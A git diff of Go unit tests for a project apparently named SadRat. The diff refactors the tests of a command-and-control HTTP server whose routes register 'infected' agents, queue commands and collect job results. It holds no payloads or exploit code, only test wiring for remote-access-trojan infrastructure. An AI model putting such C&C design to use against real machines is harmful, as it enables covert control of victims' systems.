@@ -11,12 +11,14 @@ import (
 	"github.com/VitorDie/SadRat/internal/domain"
 	"github.com/VitorDie/SadRat/internal/presentation"
 	"github.com/VitorDie/SadRat/internal/repository"
+	"github.com/VitorDie/SadRat/internal/service"
 )
 
 func TestServerHTTP_GiveAnUUIDForAgentRequest(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e injetamos no Servidor HTTP
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// 2. Ação: Simulamos um Agente recém-infectado chamando o C&C via rede
 	req, err := http.NewRequest(http.MethodPost, "/api/agents", nil)
@@ -28,7 +30,7 @@ func TestServerHTTP_GiveAnUUIDForAgentRequest(t *testing.T) {
 	rr := httptest.NewRecorder()
 	
 	// A função Router() deve devolver o roteador que contém as URLs mapeadas
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação de Rota e Status HTTP
 	if status := rr.Code; status != http.StatusCreated { // Esperamos HTTP 201 (Created)
@@ -50,7 +52,8 @@ func TestServerHTTP_GiveAnUUIDForAgentRequest(t *testing.T) {
 func TestServerHTTP_ReceiveCommand(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e o Servidor
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Precisamos de um Agente salvo no banco para o Operador poder mandar comando pra ele
 	targetAgentID := "agent-123"
@@ -67,7 +70,7 @@ func TestServerHTTP_ReceiveCommand(t *testing.T) {
 	rr := httptest.NewRecorder()
 	
 	// O Roteador recebe a requisição HTTP e deve encaminhar para a função correta
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação de Rota e Status
 	if status := rr.Code; status != http.StatusCreated && status != http.StatusOK {
@@ -93,7 +96,8 @@ func TestServerHTTP_ReceiveCommand(t *testing.T) {
 func TestServerHTTP_SendJobs(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e o Servidor
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Simulamos que um Agente existe no banco
 	agentID := "agent-123"
@@ -114,7 +118,7 @@ func TestServerHTTP_SendJobs(t *testing.T) {
 	rr := httptest.NewRecorder()
 	
 	// O Roteador recebe a requisição HTTP e deve processar
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação de Rota e Status
 	if status := rr.Code; status != http.StatusOK {
@@ -136,7 +140,8 @@ func TestServerHTTP_SendJobs(t *testing.T) {
 func TestServerHTTP_ReceiveJobResult(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e o Servidor
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Simulamos o estado inicial do banco de dados (Agente existe e Comando existe)
 	agentID := "agent-123"
@@ -154,7 +159,7 @@ func TestServerHTTP_ReceiveJobResult(t *testing.T) {
 	req.Header.Set("Content-Type", "application/json")
 
 	rr := httptest.NewRecorder()
-	server.Router().ServeHTTP(rr, req) // Aciona a rota da API
+	handler.Router().ServeHTTP(rr, req) // Aciona a rota da API
 
 	// 3. Validação de Rota e Status (A API aceitou?)
 	if status := rr.Code; status != http.StatusOK {
@@ -179,7 +184,8 @@ func TestServerHTTP_ReceiveJobResult(t *testing.T) {
 func TestServerHTTP_SendAllJobResults(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e o Servidor
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Injetamos um Agente e um Job no banco
 	agentID := "agent-operador-1"
@@ -194,7 +200,7 @@ func TestServerHTTP_SendAllJobResults(t *testing.T) {
 	}
 
 	rr := httptest.NewRecorder()
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação
 	if status := rr.Code; status != http.StatusOK {
@@ -219,7 +225,8 @@ func TestServerHTTP_SendAllJobResults(t *testing.T) {
 
 func TestServerHTTP_SendJobResult(t *testing.T) {
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Injetamos um job que já possui resultado (Output)
 	agentID := "agent-operador-2"
@@ -238,7 +245,7 @@ func TestServerHTTP_SendJobResult(t *testing.T) {
 	}
 
 	rr := httptest.NewRecorder()
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação
 	if status := rr.Code; status != http.StatusOK {
@@ -258,7 +265,8 @@ func TestServerHTTP_SendJobResult(t *testing.T) {
 func TestServerHTTP_SendAvailableAgents(t *testing.T) {
 	// 1. Especificação: Instanciamos o cofre e o Servidor
 	repo := repository.NewServerDBPlainDataInMemory()
-	server := presentation.NewServerHTTP(repo)
+	server := service.NewConcreteServer(repo)
+	handler := presentation.NewHandlerHTTP(server)
 
 	// Injetamos dois agentes no banco para o Operador visualizar
 	repo.SaveAgent(domain.NewAgentRow("agent-alfa"))
@@ -271,7 +279,7 @@ func TestServerHTTP_SendAvailableAgents(t *testing.T) {
 	}
 
 	rr := httptest.NewRecorder()
-	server.Router().ServeHTTP(rr, req)
+	handler.Router().ServeHTTP(rr, req)
 
 	// 3. Validação de Rota e Status
 	if status := rr.Code; status != http.StatusOK {
